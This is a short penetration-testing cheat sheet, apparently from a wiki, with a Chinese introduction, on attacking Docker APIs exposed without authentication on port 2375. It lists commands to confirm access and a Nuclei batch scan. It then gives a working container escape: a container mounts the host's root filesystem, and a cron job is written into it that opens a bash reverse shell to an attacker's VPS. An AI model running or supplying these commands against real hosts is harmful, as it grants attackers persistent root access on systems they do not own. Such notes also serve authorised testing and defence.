# Docker

<details>

<summary>Introduction</summary>

Docker 是一种开源的容器化平台，用于构建、发布和管理应用程序和其依赖的轻量级容器。容器是一种独立、可移植的软件包，其中包含了应用程序运行所需的所有组件，如代码、运行时环境、系统工具和库。Docker 利用操作系统级虚拟化技术，使得应用程序可以在几乎任何环境中以相同的方式运行，无论是开发、测试、部署到生产环境还是在云端。它提供了简单易用的命令行接口和丰富的功能，如镜像管理、容器网络和存储卷等，成为了现代软件开发和部署的核心工具之一。

</details>

<table><thead><tr><th width="178">Name</th><th>Docker</th></tr></thead><tbody><tr><td><strong>Default Port</strong></td><td>2375</td></tr><tr><td><strong>GetShell?</strong></td><td>Yes</td></tr><tr><td><strong>Vulnerability</strong></td><td><ul><li>Unauthorized Access</li><li>Container Escape (GetShell)</li></ul></td></tr></tbody></table>

## Unauthorized Access

{% code title="Environment" %}
```bash
HOST=; PORT=2375; # TARGET HOST INFO
```
{% endcode %}

{% code title="Validation" %}
```bash
curl $HOST:$PORT/version
curl $HOST:$PORT/info
docker -H tcp://$HOST:$PORT images
docker -H tcp://$HOST:$PORT container
```
{% endcode %}

### Batch Testing

{% code title="Use Nuclei" %}
```bash
nuclei -t ~/nuclei-templates/http/misconfiguration/exposed-docker-api.yaml -l hosts-port.txt
```
{% endcode %}

{% code title="Reference Docs" %}
```
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/exposed-docker-api.yaml
```
{% endcode %}

## Container Escape

{% code title="Environment" %}
```bash
HOST=; PORT=2375; # TARGET HOST INFO
```
{% endcode %}

{% code title="Container Escape" %}
```bash
# Create a container using Docker on the target host
# If there is no network, try adding --network host
docker -H tcp://$HOST:$PORT run -it -v /:/mnt nginx:latest --name nginx-test /bin/bash

# Inside the container
HOST=; PORT=6789; # VPS INFO
echo "* * * * * root /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1 > /mnt/etc/cron.d/reverse_shell
```
{% endcode %}
